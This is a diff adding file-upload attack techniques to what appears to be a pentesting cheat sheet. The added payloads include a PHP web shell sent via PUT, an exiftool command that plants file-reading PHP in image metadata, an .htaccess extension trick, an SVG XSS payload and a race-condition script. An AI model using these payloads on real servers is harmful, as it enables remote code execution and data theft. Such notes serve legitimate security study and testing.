@@ -17,17 +17,102 @@
 * Upload payload file&#x20;
 * No restriction specified in accept-type header - all types (_/_) allowed
 
+#### Content-Type Restriction Bypass
 
+* Modify `Content-Type` header to allowed file types
+* Upload any php/similar file
+* Server does not validate content-type header with the file extension or contents
 
+#### Path Traversal Bypass
 
+* Restrictions on user-directory for permitted file types&#x20;
+* Change the directory where files are uploaded
+* Filename contains -> `../../exploit.php` (try encoding for ../../)
 
+#### Extension Blacklist Bypass&#x20;
 
+* Overriding server configuration (etc/apache2/apache2.conf)&#x20;
+* `LoadModule php_module /usr/lib/apache2/modules/libphp.so`\
+  `AddType application/x-httpd-php .php`&#x20;
+* Create special configuration file within individual directories
+* Upload a .htaccess file
+* `AddType application/x-httpd-php .133t`&#x20;
+* Modify `Content-Type` to text/plain&#x20;
+* Upload a php payload with extension .133t which will be treated as php file.
 
+#### Obfuscated File Extension&#x20;
 
+* Try following patterns&#x20;
+  * filename.php.jpg, filename.jpg.php, filename.php., filename%2Ephp (url encode), filename.pphphp&#x20;
+* Provide multiple extensions&#x20;
+* Add trailing characters (".") - > filename.php.&#x20;
+* Try using the URL encoding (or double URL encoding) for dots, forward slashes, and backward slashes&#x20;
+* Add semicolons or URL-encoded null byte characters before the file extension.&#x20;
+* Try using multibyte Unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. (xC0 x2E, xC4 xAE or xC0 xAE translated to x2E if parsed as UTF-8 string)&#x20;
+* Use nested extensions to bypass stripping
 
+#### Flawed validation of the file's contents&#x20;
 
+* Certain file types may always contain a specific sequence of bytes in their header or footer&#x20;
+* eg -> JPEG files always begin with the bytes FF D8 FF&#x20;
+* [ExifTool](https://exiftool.org/)
+  * Create a polyglot JPEG file containing malicious code within its metadata \*
+  * `exiftool -Comment="<?php echo 'START ' . file_get_contents('<path>') . ' END'; ?>"-i <input-image> -o <output-image>`
+  * Can find the output between START and END strings
 
+#### Exploiting file upload race conditions
 
+* Uploads the file to a temp directory and perform validation - virus checks etc&#x20;
+* Uploaded file is moved to an accessible folder, where checked for viruses.&#x20;
+* Malicious files are removed once the virus check completes&#x20;
+* Turbo Intruder extender required
+
+<details>
+
+<summary>Race Condition Code</summary>
+
+```python
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)
+    request1 = '''<YOUR-POST-REQUEST>'''
+    request2 = '''<YOUR-GET-REQUEST>'''
+    
+    # the 'gate' argument blocks the final byte of each request until openGate is invoked
+    engine.queue(request1, gate='race1')
+    
+    for x in range(5):
+        engine.queue(request2, gate='race1')
+        # wait until every 'race1' tagged request is ready
+    	# then send the final byte of each request
+    	# (this method is non-blocking, just like queue)
+    
+    engine.openGate('race1')
+    engine.complete(timeout=60)
+
+def handleResponse(req, interesting):
+    table.add(req)
+```
+
+</details>
+
+#### Malicious Client-Side Scripts
+
+* Upload HTML files or SVG images, you can potentially use tags to create stored XSS payloads
+
+<details>
+
+<summary>SVG Payload</summary>
+
+```svg
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+  <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+    <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+    <script type="text/javascript">alert("XSS");</script>
+  </svg>
+```
+
+</details>
 
 <details>
 
@@ -79,3 +164,27 @@ End Sub
 ```
 
 </details>
+
+#### Exploiting vulnerabilities in the parsing of uploaded files&#x20;
+
+* Server parses XML-based files, such as Microsoft Office .doc or .xls files, this may be a potential vector for XXE injection attacks.
+
+#### Uploading files using PUT
+
+<details>
+
+<summary>HTTP Request</summary>
+
+```http
+PUT /images/exploit.php HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-httpd-php
+Content-Length: 49
+
+<?php system($_GET[‘c’]);?>
+```
+
+</details>
+
+
+
